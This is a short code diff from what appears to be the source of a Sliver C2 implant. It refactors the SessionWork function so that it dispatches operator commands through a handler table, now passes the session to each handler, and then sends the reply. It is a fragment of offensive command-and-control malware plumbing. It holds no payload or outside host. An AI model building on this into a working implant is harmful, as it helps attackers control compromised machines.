@@ -170,16 +170,17 @@ VOID SessionWork
 	PSLIVER_SESSION_CLIENT pSession = NULL;
 	DWORD i = 0;
 	DWORD dwOldInterval = 0;
-	LPVOID* HandlerList = NULL;
-	SYSTEM_HANDLER SystemTaskHandler = NULL;
+	REQUEST_HANDLER* HandlerTable = NULL;
+	REQUEST_HANDLER SystemTaskHandler = NULL;
 	PENVELOPE pRecvEnvelope = NULL;
 	PENVELOPE pSendEnvelope = NULL;
 
 	pRecvEnvelope = pWrapper->pEnvelope;
-	HandlerList = GetSystemHandler();
-	SystemTaskHandler = HandlerList[pRecvEnvelope->uType];
+	HandlerTable = GetSystemHandler();
+	pSession = pWrapper->pSession;
+	SystemTaskHandler = HandlerTable[pRecvEnvelope->uType];
 	if (SystemTaskHandler != NULL) {
-		pSendEnvelope = SystemTaskHandler(pRecvEnvelope);
+		pSendEnvelope = SystemTaskHandler(pRecvEnvelope, pSession);
 	}
 	else {
 		pSendEnvelope = ALLOC(sizeof(ENVELOPE));
@@ -187,7 +188,6 @@ VOID SessionWork
 		pSendEnvelope->uUnknownMessageType = 1;
 	}
 
-	pSession = pWrapper->pSession;
 	if (!pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pSendEnvelope)) {
 		goto CLEANUP;
 	}
@@ -196,7 +196,7 @@ CLEANUP:
 	FreeEnvelope(pSendEnvelope);
 	FreeEnvelope(pRecvEnvelope);
 	FREE(pWrapper);
-	FREE(HandlerList);
+	FREE(HandlerTable);
 
 	return;
 }
